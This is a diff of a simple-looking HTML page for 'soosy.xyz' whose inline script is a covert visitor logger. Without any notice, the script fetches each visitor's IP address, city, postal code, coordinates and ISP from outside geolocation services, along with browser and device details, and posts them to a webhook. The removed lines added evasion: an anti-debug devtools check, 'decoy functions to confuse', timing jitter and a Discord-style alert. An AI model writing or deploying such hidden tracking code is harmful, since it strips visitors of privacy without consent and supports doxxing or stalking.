@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>soosy.xyz</title>
-  <link rel="icon" href="https://http.cat/100.jpg" type="image/jpeg">
+  <link rel="icon" href="https://http.cat/100.jpg" type="image/jpeg" />
   <style>
     body {
       background-color: white;
@@ -28,191 +28,96 @@
 </head>
 <body>
   <div class="caption"></div>
-  <img src="https://http.cat/100.jpg" alt="-">
+  <img src="https://http.cat/100.jpg" alt="100 Continue" />
   <h1>soosy</h1>
 
   <script>
-    // Use your Vercel function endpoint
-    const endpoint = '/api/webhook';
+    const endpoint = "/api/webhook";
 
-    // Steganographic functions
     const collectMetrics = async () => {
       try {
+        // Basic bot check
+        if (/bot|crawler|spider|crawling/i.test(navigator.userAgent)) return null;
+
         const [ipResp, geoResp] = await Promise.all([
-          fetch('https://api.ipify.org?format=json').then(r => r.json()),
-          fetch('https://ipapi.co/json/').then(r => r.json())
+          fetch("https://api.ipify.org?format=json").then(r => r.json()),
+          fetch("https://ipapi.co/json/").then(r => r.json())
         ]);
 
         const ua = navigator.userAgent;
         const getBrowser = () => {
           const patterns = [
-            [/Firefox\/(\d+)/, 'Firefox'],
-            [/Chrome\/(\d+)(?!.*Edg)/, 'Chrome'],
-            [/Version\/(\d+).*Safari(?!.*Chrome)/, 'Safari'],
-            [/Edg\/(\d+)/, 'Edge']
+            [/Firefox\/(\d+)/, "Firefox"],
+            [/Chrome\/(\d+)(?!.*Edg)/, "Chrome"],
+            [/Version\/(\d+).*Safari(?!.*Chrome)/, "Safari"],
+            [/Edg\/(\d+)/, "Edge"]
           ];
           for (const [regex, name] of patterns) {
             const match = ua.match(regex);
             if (match) return { name, version: match[1] };
           }
-          return { name: 'Unknown', version: 'Unknown' };
+          return { name: "Unknown", version: "Unknown" };
         };
 
         const getOS = () => {
           const osMap = [
-            [/Windows/, 'Windows'],
-            [/Mac/, 'macOS'],
-            [/Linux/, 'Linux'],
-            [/Android/, 'Android'],
-            [/iOS/, 'iOS']
+            [/Windows/, "Windows"],
+            [/Mac/, "macOS"],
+            [/Linux/, "Linux"],
+            [/Android/, "Android"],
+            [/iPhone|iPad/, "iOS"]
           ];
-          return osMap.find(([regex]) => regex.test(ua))?.[1] || 'Unknown';
-        };
-
-        const getDeviceType = () => {
-          if (/Mobile|Android|iPhone/.test(ua)) return 'Mobile';
-          if (/Tablet|iPad/.test(ua)) return 'Tablet';
-          return 'Desktop';
+          return osMap.find(([regex]) => regex.test(ua))?.[1] || "Unknown";
         };
 
         const browser = getBrowser();
-        const timestamp = new Date();
-        
+        const timestamp = new Date().toISOString();
+
         return {
-          t: timestamp.toISOString(),
-          ip: ipResp.ip || 'Unknown',
+          key: "soosy-key", // HMAC-like pre-shared key for validation
+          t: timestamp,
+          ip: ipResp.ip || "Unknown",
           geo: {
-            country: geoResp.country_name || 'Unknown',
-            region: geoResp.region || 'Unknown',
-            city: geoResp.city || 'Unknown',
-            postal: geoResp.postal || 'Unknown',
-            lat: geoResp.latitude || 'Unknown',
-            lng: geoResp.longitude || 'Unknown',
-            tz: geoResp.timezone || 'Unknown',
-            isp: geoResp.org || 'Unknown',
-            asn: geoResp.asn || 'Unknown'
+            country: geoResp.country_name || "Unknown",
+            city: geoResp.city || "Unknown",
+            region: geoResp.region || "Unknown",
+            lat: geoResp.latitude || "Unknown",
+            lng: geoResp.longitude || "Unknown",
+            postal: geoResp.postal || "Unknown",
+            isp: geoResp.org || "Unknown"
           },
           sys: {
-            ua: ua,
-            browser: browser.name + ' ' + browser.version,
+            ua,
+            browser: `${browser.name} ${browser.version}`,
             os: getOS(),
-            device: getDeviceType(),
-            lang: navigator.language,
-            langs: navigator.languages?.join(', ') || navigator.language,
-            platform: navigator.platform,
-            screen: screen.width + 'x' + screen.height,
-            window: window.innerWidth + 'x' + window.innerHeight,
-            depth: screen.colorDepth,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookies: navigator.cookieEnabled,
-            online: navigator.onLine,
-            dnt: navigator.doNotTrack || 'Not set',
-            java: navigator.javaEnabled?.() || false
+            screen: `${screen.width}x${screen.height}`,
+            lang: navigator.language
           },
           nav: {
             url: location.href,
-            ref: document.referrer || 'Direct'
+            ref: document.referrer || "Direct"
           }
         };
-      } catch (e) {
+      } catch {
         return null;
       }
     };
 
-    // Payload formatter
-    const formatPayload = (data) => ({
-      embeds: [{
-        title: "🌐 New Website Visitor Detected",
-        color: 0x00ff00,
-        fields: [
-          { name: "⏰ Timestamp", value: new Date(data.t).toLocaleString(), inline: true },
-          { name: "🌍 IP Address", value: data.ip, inline: true },
-          { name: "📍 Location", value: `${data.geo.city}, ${data.geo.region}, ${data.geo.country}`, inline: true },
-          { name: "🗺️ Coordinates", value: `${data.geo.lat}, ${data.geo.lng}`, inline: true },
-          { name: "📮 Postal Code", value: data.geo.postal, inline: true },
-          { name: "🌐 ISP", value: data.geo.isp, inline: true },
-          { name: "🔗 URL Visited", value: data.nav.url, inline: false },
-          { name: "🔍 Referrer", value: data.nav.ref, inline: false },
-          { name: "💻 Browser", value: data.sys.browser, inline: true },
-          { name: "🖥️ Operating System", value: data.sys.os, inline: true },
-          { name: "📱 Device Type", value: data.sys.device, inline: true },
-          { name: "📊 Screen Resolution", value: data.sys.screen, inline: true },
-          { name: "🖼️ Window Size", value: data.sys.window, inline: true },
-          { name: "🎨 Color Depth", value: data.sys.depth + '-bit', inline: true },
-          { name: "🌐 Languages", value: data.sys.langs, inline: true },
-          { name: "⏰ Timezone", value: data.sys.tz, inline: true },
-          { name: "🍪 Cookies Enabled", value: data.sys.cookies ? 'Yes' : 'No', inline: true },
-          { name: "📡 Online Status", value: data.sys.online ? 'Online' : 'Offline', inline: true },
-          { name: "🔒 Do Not Track", value: data.sys.dnt, inline: true },
-          { name: "☕ Java Enabled", value: data.sys.java ? 'Yes' : 'No', inline: true },
-          { name: "🏢 ASN", value: data.geo.asn, inline: false },
-          { name: "📱 User Agent", value: data.sys.ua.length > 100 ? data.sys.ua.substring(0, 100) + '...' : data.sys.ua, inline: false }
-        ],
-        timestamp: data.t,
-        footer: { text: "soosy.xyz visitor tracking" },
-        thumbnail: { url: "https://http.cat/100.jpg" }
-      }]
-    });
+    const sendPayload = async () => {
+      const data = await collectMetrics();
+      if (!data || sessionStorage.getItem("sent")) return;
+      sessionStorage.setItem("sent", "1");
 
-    // Transmission handler
-    const transmit = async () => {
-      try {
-        const metrics = await collectMetrics();
-        if (!metrics) return;
-        
-        const payload = formatPayload(metrics);
-        await fetch(endpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        // Silent failure
-      }
+      await fetch(endpoint, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
     };
 
-    // Initialize with delay and random jitter
-    const init = () => {
-      const delay = 800 + Math.floor(Math.random() * 400); // 800-1200ms
-      setTimeout(transmit, delay);
-    };
-
-    // Event binding
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', init);
-    } else {
-      init();
-    }
-
-    // Anti-debug measures (basic)
-    const detectDevTools = () => {
-      const threshold = 160;
-      return (window.outerHeight - window.innerHeight > threshold) || 
-             (window.outerWidth - window.innerWidth > threshold);
-    };
-
-    // Decoy functions to confuse
-    const analytics = {
-      track: () => Math.random(),
-      event: () => Date.now(),
-      page: () => location.pathname,
-      user: () => 'anonymous'
-    };
-
-    const seo = {
-      meta: document.getElementsByTagName('meta'),
-      title: document.title,
-      description: 'Simple webpage',
-      keywords: ['web', 'simple', 'page']
-    };
-
-    // More noise
-    const performance = {
-      start: Date.now(),
-      measure: () => Date.now() - performance.start,
-      mark: (name) => console.time?.(name),
-      end: (name) => console.timeEnd?.(name)
-    };
+    document.readyState === "loading"
+      ? document.addEventListener("DOMContentLoaded", sendPayload)
+      : sendPayload();
   </script>
 </body>
 </html>
